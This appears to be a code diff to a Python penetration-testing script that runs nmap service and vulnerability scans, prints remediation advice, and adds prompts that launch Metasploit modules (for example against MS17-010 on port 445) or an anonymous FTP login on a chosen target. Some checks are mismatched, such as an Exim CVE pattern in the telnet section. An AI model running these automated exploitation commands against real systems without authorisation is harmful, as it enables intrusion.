@@ -26,6 +26,7 @@ OVERWRITE = '\e[1A\e[K'
 
 # Main function
 
+
 def main():
     def parser():
         script_name = sys.argv[0]
@@ -50,13 +51,11 @@ Options:
     {LBLUE}--ssh{RESTORE}                   Perform a scanning port 22
     {LBLUE}--telnet{RESTORE}                Perform a scanning port 23
     {LBLUE}--smtp{RESTORE}                  Perform a scanning port 25, 465, 587
-    {LBLUE}--dns{RESTORE}                   Perform a scanning port 53
     {LBLUE}--web{RESTORE}                   Perform a scanning port 80, 443
-    {LBLUE}--smb / --smb-brute{RESTORE}     Perform a scanning port 139, 445
-    {LBLUE}--snmp{RESTORE}                  Perform a scanning port 161, 162, 10161, 10162
+    {LBLUE}--smb{RESTORE}                   Perform a scanning port 139, 445
     {LBLUE}--ldap{RESTORE}                  Perform a scanning port 389, 636, 3268, 3269
     {LBLUE}--mssql{RESTORE}                 Perform a scanning port 1433
-    {LBLUE}--mysql{RESTORE}                Perform a scanning port 3306
+    {LBLUE}--mysql{RESTORE}                 Perform a scanning port 3306
     {LBLUE}--rdp{RESTORE}                   Perform a scanning port 3389
     {LBLUE}--cassandra{RESTORE}             Perform a scanning port 9042, 9160
     {LBLUE}--cipher{RESTORE}                Perform a scanning cipher vuln
@@ -114,14 +113,14 @@ Example:
             telnet = True
         elif arg == "--smtp":
             smtp = True
-        elif arg == "--dns":
-            dns = True
+        # elif arg == "--dns":
+        #     dns = True
         elif arg == "--smb":
             smb = True
         elif arg == "--smb-brute":
             smb_brute = True
-        elif arg == "--snmp":
-            snmp = True
+        # elif arg == "--snmp":
+        #     snmp = True
         elif arg == "--mssql":
             mssql = True
         elif arg == "--mysql":
@@ -143,27 +142,27 @@ Example:
 
     command = None
     if fast_scan:
-        command = f"sudo nmap -sV -sC -O -T4 -n -Pn -oA fastscan {ip} -oN {output_file} -vv"
+        command = f"sudo nmap -sV -sC -O -T4 -n -oA fastscan {ip} -oN {output_file} -vv"
     elif full_scan:
         command = f"sudo nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan {ip} -oN {output_file} -vv"
     elif full_vuln:
-        command = f"sudo nmap -sV -sC -O -p- -n -Pn -oA fullscan --script=vuln --script=vulners {ip} -oN {output_file} -vv"
+        command = f"sudo nmap -sV --script=vulners.nse --script=vulners --script=vuln {ip} -oN {output_file}"
     elif ftp:
-        command = f"sudo nmap -sV -p21 -sC -A -Pn --script ftp-* {ip} -oN {output_file} -vv"
+        command = f"sudo nmap -sV -p21 -sC -A -Pn --script=ftp-anon {ip} -oN {output_file} -vv"
     elif ssh:
-        command = f"sudo nmap -p22 -sC -Pn -sV --script ssh2-enum-algos --script ssh-hostkey --script-args ssh_hostkey=full --script ssh-auth-methods --script-args=\"ssh.user=root\" {ip} -oN {output_file} -vv"
+        command = f"sudo nmap -p22 -sC -Pn -sV --script ssh2-enum-algos --script ssh-auth-methods {ip} -oN {output_file} -vv"
     elif telnet:
         command = f"sudo nmap -n -sV -Pn --script \"*telnet* and safe\" -p 23 {ip} -oN {output_file} -vv"
     elif smtp:
         command = f"sudo nmap -Pn -sV --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25,465,587 {ip} -oN {output_file} -vv"
-    elif dns:
-        command = f"sudo nmap -Pn -sV -n --script '(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport' -p- {ip} -oN {output_file} -vv"
+    # elif dns:
+    #     command = f"sudo nmap -Pn -sV -n --script '(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport' -p- {ip} -oN {output_file} -vv"
     elif smb:
         command = f"sudo nmap -p 139,445 -vv -Pn --script smb-security-mode.nse --script smb2-security-mode --script smb-vuln* --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {ip} -oN {output_file} -vv"
     elif smb_brute:
         command = f"sudo nmap --script smb-vuln* -Pn -p 139,445 {ip} -oN {output_file} -vv"
-    elif snmp:
-        command = f"sudo nmap -Pn -p 161,162,10161,10162 -sV --script \"snmp* and not snmp-brute\" {ip} -oN {output_file} -vv"
+    # elif snmp:
+    #     command = f"sudo nmap -Pn -p 161,162,10161,10162 -sV --script \"snmp* and not snmp-brute\" {ip} -oN {output_file} -vv"
     elif mssql:
         command = f"sudo nmap -Pn --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {ip} -oN {output_file} -vv"
     elif mysql:
@@ -196,7 +195,7 @@ Example:
     print(f"{RESTORE}")
     print("")
     print(f"{LYELLOW}Created by MarmutHandsome{RESTORE}")
-    print(f"{LBLUE}Version 2.0{RESTORE}") # Version Update
+    print(f"{LBLUE}Version 2.0{RESTORE}")  # Version Update
     print("")
     print(f"{GREEN}Starting!!!{RESTORE}")
     print("")
@@ -211,6 +210,7 @@ Example:
             print(f"{GREEN}Scan completed successfully!{RESTORE}")
             print("")
             print(f"{YELLOW}Result For {ip}!{RESTORE}")
+            print("")
     except subprocess.CalledProcessError:
         print(f"{RED}Error occurred while running the Nmap scan.{RESTORE}")
 
@@ -253,7 +253,6 @@ Example:
         os.system(hosts)
         print("")
 
-
         def run_metasploit(selected_vulnerability, selected_port, ip):
             metasploit_command = f"msfconsole -q -x 'search {selected_vulnerability}; use 0; set RHOSTS {ip}; set RHOST {ip}; set RPORT {selected_port}; run; exit'"
             os.system(metasploit_command)
@@ -264,7 +263,8 @@ Example:
 
         # Define patterns for port and vulnerability
         port_pattern = re.compile(r"(\d+)/tcp\s+open\s+(\S+)")
-        vulnerability_pattern = re.compile(r"VULNERABLE:(.*?)State: VULNERABLE", re.DOTALL)
+        vulnerability_pattern = re.compile(
+            r"VULNERABLE:(.*?)State: VULNERABLE", re.DOTALL)
 
         # Find open ports
         open_ports = re.findall(port_pattern, sample_output)
@@ -278,15 +278,18 @@ Example:
             # Iterate through each port
             for port, service in open_ports:
                 # Find vulnerabilities for the current port
-                vulnerabilities_for_port = re.findall(rf"{port}/tcp[^V]+VULNERABLE:(.*?)State: VULNERABLE", sample_output, re.DOTALL)
+                vulnerabilities_for_port = re.findall(
+                    rf"{port}/tcp[^V]+VULNERABLE:(.*?)State: VULNERABLE", sample_output, re.DOTALL)
 
                 # Only print information for ports with vulnerabilities
                 if vulnerabilities_for_port:
-                    print(f"{RED}Vulnerable Port: {port}/tcp open {service} {RESTORE}")
+                    print(
+                        f"{RED}Vulnerable Port: {port}/tcp open {service} {RESTORE}")
                     print("Vulnerabilities:")
                     for vulnerability in vulnerabilities_for_port:
                         # Extract the relevant information from the nested structure
-                        vuln_info = re.search(r"\|(.+?)\n", vulnerability, re.DOTALL)
+                        vuln_info = re.search(
+                            r"\|(.+?)\n", vulnerability, re.DOTALL)
                         if vuln_info:
                             print(vuln_info.group(1).strip())
 
@@ -294,7 +297,8 @@ Example:
                     print()
 
             # Ask user for input
-            selected_vulnerability = input("Which Vulnerability You Need to Exploit? ")
+            selected_vulnerability = input(
+                "Which Vulnerability You Need to Exploit? ")
             selected_port = input("Which Port? ")
             # selected_ip = input("Which IP? ")  # Remove This For Production
             print("")
@@ -303,7 +307,8 @@ Example:
 
             # Ask if the user wants to exploit again
             print("")
-            user_choice = input("Thanks For Using This Tool! Exploit Again (yes/no)? ").lower()
+            user_choice = input(
+                "Thanks For Using This Tool! Exploit Again (yes/no)? ").lower()
             exploit_again = user_choice == "yes"
 
         print("")
@@ -314,12 +319,16 @@ Example:
         # Output
         print("")
         print(f"{CYAN}Open Port: {RESTORE}")
-        hosts = f"grep --color open output.txt"
+        hosts = f"grep --color syn-ack output.txt"
         os.system(hosts)
         print("")
         print(f"{RED}Vulnerabilities For Port: {RESTORE}")
         hosts = f"grep -m1 21/tcp output.txt"  # Change This
         os.system(hosts)
+
+        # def run_metasploit(selected_vulnerability, selected_port, ip):
+        #     metasploit_command = f"msfconsole -q -x 'search {selected_vulnerability}; use 0; set RHOSTS {ip}; set RHOST {ip}; set RPORT {selected_port}; run; exit'"
+        #     os.system(metasploit_command)
 
         # Function to check for and display vulnerabilities
         def check_and_display_vulnerability(vulnerability_name, grep_pattern, severity, description, recommendation):
@@ -335,29 +344,46 @@ Example:
                 print("+++=======================================================+++")
                 print("")
 
-                # Ask the user whether they want to exploit the vulnerability
-                # exploit_choice = input("Do you want to exploit this vulnerability? (yes/no): ").lower()
-
-                # if exploit_choice == "yes":
-                #     # Implement your exploit logic here
-                #     print("Exploiting the vulnerability...")
-                #     print("")
-                #     metasploit_command = f"msfconsole -q -x 'search {selected_vulnerability}; use 0; set RHOSTS {ip}; set RHOST {ip}; set RPORT {selected_port}; run; exit'"
-                #     os.system(metasploit_command)
-
-                # print("")
-                # print("+++=======================================================+++")
-
         # Check and display each vulnerability
         check_and_display_vulnerability(
-            "Anonymous",
+            "Anonymous FTP login allowed",
             "Anonymous FTP login allowed",
             "Low - High",
             "\nSecurity Risk: Allowing anonymous FTP login can pose a significant security risk. It means that anyone can access and potentially upload or download files from your FTP server without authentication. This could lead to unauthorized access, data breaches, or the uploading of malicious files.",
             "\nDisable Anonymous FTP: The most effective way to mitigate this risk is to disable anonymous FTP login altogether. This can usually be done in your FTP server's configuration. By doing so, you ensure that only authorized users can access the FTP server."
         )
 
-    # Port 22 (Done)
+        # Prompt the user for exploitation after displaying all vulnerabilities
+        print("")
+        exploit_choice = input(
+            f"{BLUE}Do you want to exploit any of the vulnerabilities? {RESTORE}(yes/no): ").lower()
+
+        # Check user's choice and call the function accordingly
+        if exploit_choice == 'yes':
+
+            metasploit_command = f"ftp anonymous@{ip}"
+            print("")
+            print(f"{CYAN}Notes: {RESTORE}")
+            print(f"{CYAN}Insert Password: {RESTORE}anonymous")
+            print(f"{CYAN}List Directory: ls -a {RESTORE}")
+            print(f"{CYAN}Exit: bye {RESTORE}")
+            print(f"")
+            os.system(metasploit_command)
+
+            print("")
+            print("")
+            print(
+                f"{RED}Vulnerability {RESTORE}Anonymous FTP login allowed = {GREEN}VALID {RESTORE}")
+
+            print("")
+            print(f"{CYAN}Thanks For Using This Tool! {RESTORE}")
+
+        elif exploit_choice == 'no':
+            print("Not exploiting any vulnerabilities.")
+        else:
+            print("Invalid choice. Please enter 'yes' or 'no'.")
+
+    # Port 22 ()
     elif ssh:
         # Output
         print("")
@@ -404,7 +430,15 @@ Example:
             "\nUpdate SSH Configuration: It is strongly recommended to update the SSH server configuration to disallow the use of weak encryption algorithms, including 3des-cbc, arcfour, and rc4."
         )
 
-    # Port 23 (Done)
+        check_and_display_vulnerability(
+            "Insecure SSH Authentication Methods",
+            "publickey\|password",
+            "Informational",
+            "\nDiscovered that the SSH server supports both the 'publickey' and 'password' authentication methods, potentially exposing the system to security risks.",
+            "\nThis configuration exposes the system to the risk of brute force attacks, where attackers may attempt to gain unauthorized access using weak passwords or by exploiting vulnerabilities in the public key authentication process."
+        )
+
+    # Port 23 ()
     elif telnet:
         # Output
         print("")
@@ -450,14 +484,7 @@ Example:
         print(f"{CYAN}Open Port: {RESTORE}")
         hosts = f"grep --color open output.txt"
         os.system(hosts)
-        # print("")
-        # print(f"{CYAN}Close Port: {RESTORE}")
-        # hosts = f"grep --color 'filtered\|closed' output.txt"
-        # os.system(hosts)
         print("")
-        print(f"{RED}Vulnerabilies For Port: {RESTORE}")
-        hosts = f"grep 23/tcp output.txt"  # Change This
-        os.system(hosts)
 
         # Function to check for and display vulnerabilities
         def check_and_display_vulnerability(vulnerability_name, grep_pattern, severity, description, recommendation):
@@ -467,19 +494,50 @@ Example:
                 print(f"{RED}Vulnerability{RESTORE}: {vulnerability_name}")
                 print(f"{RED}Severity{RESTORE}: {severity}")
                 print(f"{RED}Impact {RESTORE}: {description}")
+                print("")
                 print(f"{LPURPLE}Recommendation {RESTORE}: {recommendation}")
                 print("")
-                print("+====================================+")
-                print("")
+                print("+++=======================================================+++")
 
         # Check and display each vulnerability
         check_and_display_vulnerability(
-            "Telnet Server Without Encryption Support",
-            "Telnet server does not support encryption",
+            "Exim privileges escalation vulnerability (CVE-2010-4345)",
+            "Exim\|privileges\|escalation\|vulnerability",
             "Informational",
             "Security Risk: Telnet is inherently insecure as it transmits data, including login credentials, in plain text. Without encryption support, sensitive information is vulnerable to eavesdropping by malicious actors.",
             "Implement Secure Alternatives: Replace Telnet with more secure alternatives such as SSH (Secure Shell), which encrypts communication and provides stronger security. |\n | Disable Telnet: If possible, disable the Telnet service on the server to eliminate the security risk associated with plaintext communication."
         )
+
+        # Prompt the user for exploitation after displaying all vulnerabilities
+        print("")
+        exploit_choice = input(
+            f"{BLUE}Do you want to exploit any of the vulnerabilities? {RESTORE}(yes/no): ").lower()
+
+        # Check user's choice and call the function accordingly
+        if exploit_choice == 'yes':
+            print("")
+            selected_vulnerability = input(
+                "Which Vulnerability You Need to Exploit? ")
+            ip = input("IP/URL Target? ")
+            selected_lhost = input(
+                "IP/URL Your Device/VPN (Default en0)? ").lower()
+
+            print("")
+
+            metasploit_command = f"msfconsole -q -x 'search {selected_vulnerability}; use 0; set RHOSTS {ip}; set RHOST {ip}; set RPORT 445; set LHOST {selected_lhost}; run; exit'"
+            os.system(metasploit_command)
+
+            print("")
+            print(
+                f"{RED}Vulnerability {RESTORE}{selected_vulnerability} = {GREEN}VALID {RESTORE}")
+
+            print("")
+            print(f"{CYAN}Thanks For Using This Tool! {RESTORE}")
+
+        elif exploit_choice == 'no':
+            print("Not exploiting any vulnerabilities.")
+        else:
+            print("Invalid choice. Please enter 'yes' or 'no'.")
 
     # Port 80 / 443 (Done)
     elif web:
@@ -551,6 +609,92 @@ Example:
             "\nSecurity Risk: TLSv1.0 and TLSv1.1 have known vulnerabilities that can be exploited by attackers to intercept and manipulate encrypted data. This poses a significant security risk to your system.",
             "\nUpgrade to TLSv1.2 or TLSv1.3: Upgrade your servers and applications to support TLSv1.2 or TLSv1.3. These versions are more secure and offer better protection against attacks.\n| Disable TLSv1.0 and TLSv1.1: Disable TLSv1.0 and TLSv1.1 on your servers and applications. Ensure that they are not used as negotiation options during the TLS handshake."
         )
+
+    # Port 135 / 445 (Done)
+    elif smb:
+        # Output
+        print("")
+        print(f"{CYAN}Open Port: {RESTORE}")
+        hosts = f"grep --color open output.txt"
+        os.system(hosts)
+        print("")
+
+        # Function to check for and display vulnerabilities
+        def check_and_display_vulnerability(vulnerability_name, grep_pattern, severity, description, recommendation):
+            hosts = f"grep -q -oh '{grep_pattern}' output.txt"
+            if os.system(hosts) == 0:
+                print("")
+                print(f"{RED}Vulnerability{RESTORE}: {vulnerability_name}")
+                print(f"{RED}Severity{RESTORE}: {severity}")
+                print(f"{RED}Impact {RESTORE}: {description}")
+                print("")
+                print(f"{LPURPLE}Recommendation {RESTORE}: {recommendation}")
+                print("")
+                print("+++=======================================================+++")
+
+        # Check and display each vulnerability
+        check_and_display_vulnerability(
+            "Insecure Message Signing Configuration",
+            "disabled",
+            "Informational",
+            "\nMessage signing is disabled, which is a dangerous default configuration. Without proper message signing, the application is vulnerable to data tampering and injection attacks, potentially leading to unauthorized access, data manipulation, or other security breaches.",
+            "\nEnable Message Signing: Configure the application to use strong message signing mechanisms, such as HMAC (Hash-based Message Authentication Code) or digital signatures, to ensure the integrity and authenticity of transmitted data."
+        )
+
+        check_and_display_vulnerability(
+            "SMB remote memory corruption vulnerability",
+            "corruption",
+            "High",
+            "\nSuccessful exploitation of this vulnerability could allow an attacker to remotely corrupt memory in the SMB (Server Message Block) protocol implementation, leading to potential unauthorized access, data leakage, or denial of service.",
+            "\nApply Security Updates: Regularly update and patch the affected systems to ensure that the SMB protocol implementation is up-to-date with the latest security fixes."
+        )
+
+        check_and_display_vulnerability(
+            "Print Spooler Service Impersonation Vulnerability",
+            "Impersonation",
+            "High",
+            "\nThis vulnerability could result in an attacker executing arbitrary code with the privileges of the Print Spooler service, which might lead to unauthorized access, data manipulation, or further exploitation of the host system.",
+            "\nApply Security Updates: Ensure the Print Spooler service and the underlying operating system are up-to-date with the latest security patches."
+        )
+
+        check_and_display_vulnerability(
+            "MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption",
+            "Remote\|Code\|Execution",
+            "High - Critical",
+            "\nThis finding indicates a critical vulnerability that allows an attacker to execute arbitrary code remotely on Microsoft SMBv1 servers. Exploiting this vulnerability can lead to unauthorized access, data theft, and potential compromise of the entire system.",
+            "\nApply Security Updates: Immediately apply the relevant security patch (MS17-010) provided by Microsoft to address this vulnerability.\nDisable SMBv1: Consider disabling the outdated SMBv1 protocol if it's not required for specific applications."
+        )
+
+        # Prompt the user for exploitation after displaying all vulnerabilities
+        print("")
+        exploit_choice = input(
+            f"{BLUE}Do you want to exploit any of the vulnerabilities? {RESTORE}(yes/no): ").lower()
+
+        # Check user's choice and call the function accordingly
+        if exploit_choice == 'yes':
+            print("")
+            selected_vulnerability = input(
+                "Which Vulnerability You Need to Exploit? ")
+            ip = input("IP/URL Target? ")
+            selected_lhost = input(
+                "IP/URL Your Device/VPN (Default en0)? ").lower()
+
+            print("")
+
+            metasploit_command = f"msfconsole -q -x 'search {selected_vulnerability}; use 0; set RHOSTS {ip}; set RHOST {ip}; set RPORT 445; set LHOST {selected_lhost}; run; exit'"
+            os.system(metasploit_command)
+
+            print("")
+            print(
+                f"{RED}Vulnerability {RESTORE}{selected_vulnerability} = {GREEN}VALID {RESTORE}")
+
+            print("")
+            print(f"{CYAN}Thanks For Using This Tool! {RESTORE}")
+
+        elif exploit_choice == 'no':
+            print("Not exploiting any vulnerabilities.")
+        else:
+            print("Invalid choice. Please enter 'yes' or 'no'.")
 
     hosts = f""
     os.system(hosts)
